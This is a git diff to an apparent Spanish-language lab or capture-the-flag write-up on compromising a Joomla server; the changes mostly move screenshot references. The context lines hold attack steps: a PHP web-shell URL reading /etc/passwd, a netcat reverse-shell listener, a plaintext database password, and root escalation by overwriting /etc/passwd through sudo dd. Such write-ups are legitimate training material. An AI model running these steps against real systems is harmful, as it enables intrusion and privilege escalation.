@@ -145,6 +145,9 @@ En el menú `System > Site Templates` se encontró la posibilidad de subir archi
 ![Subida de archivos maliciosos](Imágenes/Capturas_10.png)
 
 ---
+![Ejecutando comando ls](Imágenes/Capturas_11.png)
+
+---
 
 ## Método de explotación 1: Inyección de Web Shell PHP
 
@@ -171,8 +174,12 @@ http://172.17.0.3/index.php?shadow=cat%20/etc/passwd
 ```
 
 Revela el contenido de `/etc/passwd`.
-![Ejecutando comando ls](Imágenes/Capturas_11.png)
+
 ![Leyendo /etc/passwd](Imágenes/Capturas_12.png)
+
+---
+
+![Reverse shell conexión](Imágenes/Capturas_13.png)
 
 ---
 
@@ -193,8 +200,12 @@ sudo nc -lvnp 433
 ```
 
 Y se obtiene acceso a una terminal remota.
-![Reverse shell conexión](Imágenes/Capturas_13.png)
+
 ![Terminal remota](Imágenes/Capturas_14.png)
+
+---
+
+![Archivo con credenciales](Imágenes/Capturas_15.png)
 
 ---
 
@@ -215,7 +226,7 @@ $db_pass = 'luisillosuperpassword';
 $db_name = 'joomla_db';
 ```
 
-![Archivo con credenciales](Imágenes/Capturas_15.png)
+![Permisos sudo](Imágenes/Capturas_16.png)
 
 Verificando usuarios en `/etc/passwd`, existe `luisillo`. Con estas credenciales se pudo usar:
 
@@ -229,7 +240,8 @@ Mostrando que `luisillo` puede usar:
 (ALL) NOPASSWD: /bin/dd
 ```
 
-![Permisos sudo](Imágenes/Capturas_16.png)
+![Acceso root](Imágenes/Capturas_17.png)
+
 
 ---
 
@@ -259,7 +271,7 @@ cat copia_sin_x.txt | sudo /bin/dd of=/etc/passwd
 su
 ```
 
-![Acceso root](Imágenes/Capturas_17.png)
+![Acceso root](Imágenes/Capturas_18.png)
 
 ---
 
